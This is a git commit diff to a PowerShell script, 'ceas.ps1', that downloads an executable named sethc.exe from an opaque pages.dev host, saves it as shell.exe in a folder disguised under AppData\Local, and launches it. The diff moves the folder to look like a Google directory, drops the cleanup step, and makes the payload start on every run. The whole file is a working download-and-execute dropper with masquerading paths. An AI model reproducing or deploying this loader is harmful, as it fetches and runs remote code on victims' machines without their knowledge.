8aee5678b7cc0e905980f00f5e32491f7d006958
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-14 10:02:34 +0300

    Update ceas.ps1

--- Ceas/ceas.ps1
+++ Ceas/ceas.ps1
@@ -1,8 +1,6 @@
 $url = "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/files/sethc.exe"
-$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\packages"
+$folderPath = "$env:USERPROFILE\AppData\Local\Google\packages"
 $localPath = "$folderPath\shell.exe"
-
-Remove-Item -Path $localPath -ErrorAction SilentlyContinue
 
 if (-Not (Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath
@@ -10,7 +8,6 @@ if (-Not (Test-Path $folderPath)) {
 
 if (-Not (Test-Path $localPath)) {
     Invoke-WebRequest -Uri $url -OutFile $localPath
-    Start-Process $localPath
 }
 
-
+Start-Process $localPath
